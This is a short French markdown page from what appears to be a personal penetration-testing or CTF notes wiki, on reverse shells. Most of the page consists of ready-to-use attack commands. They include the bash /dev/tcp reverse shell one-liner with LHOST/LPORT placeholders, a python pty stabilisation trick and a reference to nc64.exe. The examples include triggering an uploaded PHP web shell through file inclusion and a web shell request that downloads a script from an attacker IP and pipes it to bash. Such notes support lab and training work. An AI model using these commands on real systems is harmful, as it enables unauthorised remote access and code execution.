<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](server_procedure.md)</sub>
#Reverse shell

**Utilisation :** ouvrir un terminal de l'hôte depuis l'attaquant. Nécessite un port ouvert sur [ncat](ncat.md) au préalable.

**Script de base :**
-  *bash -i >& /dev/tcp/**LHOST**/**LPORT** 0>&1*

**Stabilisation console :**
- *python3 -c 'import pty;pty.spawn("/bin/bash")'*
- Utiliser si possible [STTY](stty.md)

**Outils :**
- [nc64.exe](nc64.md) : reverse shell sur windows

**Exemple :**
- curl nous a donné *tftp:<span>x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin* donc on peut tenter *curl 'http://*IP*/?file=/var/lib/tftpboot/shell.php'*
- curl "http://test.com/shell.php?cmd=curl%20*IP*:8000/shell.sh|bash"
- *bash -c "bash -i >& /dev/tcp/**LHOST**/**LPORT** 0>&1"*
- */bin/bash -c 'bash -i >& /dev/tcp/**LHOST**/**LPORT** 0>&1'*
